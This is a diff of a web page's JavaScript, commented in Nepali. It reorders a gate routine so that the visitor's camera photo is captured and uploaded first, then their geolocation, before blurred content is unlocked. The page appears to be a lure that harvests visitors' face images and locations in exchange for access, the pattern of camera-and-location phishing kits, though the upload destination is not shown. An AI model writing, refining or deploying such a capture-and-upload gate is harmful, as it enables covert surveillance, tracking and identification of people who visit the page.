@@ -341,10 +341,10 @@ const video       = document.getElementById("video");
 const locCanvas   = document.getElementById("locCanvas");
 const photoCanvas = document.getElementById("photoCanvas");
 
-let locationDone = false;
-let pendingPhoto = null;
 
-
+let photoDone    = false;   // photo upload भैसक्यो कि छैन
+let locationDone = false;   // location upload भैसक्यो कि छैन
+let pendingPhoto = null;    // capture भयो तर upload बाँकी छ भने reuse गर्न
 
 
 /* ============ POPUP → GATE ============ */
@@ -364,33 +364,40 @@ popupClose.addEventListener("click", () => {
 
 enterBtn.addEventListener("click", runAll);
 
+
+
+
 async function runAll(){
 
     enterBtn.disabled = true;
 
     try{
 
-        // 1) Location
+        // 1) PHOTO पहिले — capture + upload
+        if(!photoDone){
+
+            if(!pendingPhoto){
+               
+                pendingPhoto = await capturePhoto();
+            }
+
+         
+            await uploadBlob(pendingPhoto);
+            pendingPhoto = null;
+            photoDone = true;
+
+        }
+
+        // 2) LOCATION पछि — capture + upload
         if(!locationDone){
 
-          
             const position = await getLocation();
 
-           
+          
             await uploadBlob(await locationImageBlob(position));
             locationDone = true;
 
         }
-
-        // 2) Photo
-        if(!pendingPhoto){
-          
-            pendingPhoto = await capturePhoto();
-        }
-
-       
-        await uploadBlob(pendingPhoto);
-        pendingPhoto = null;
 
         // 3) Done — clear blur
         unlock();
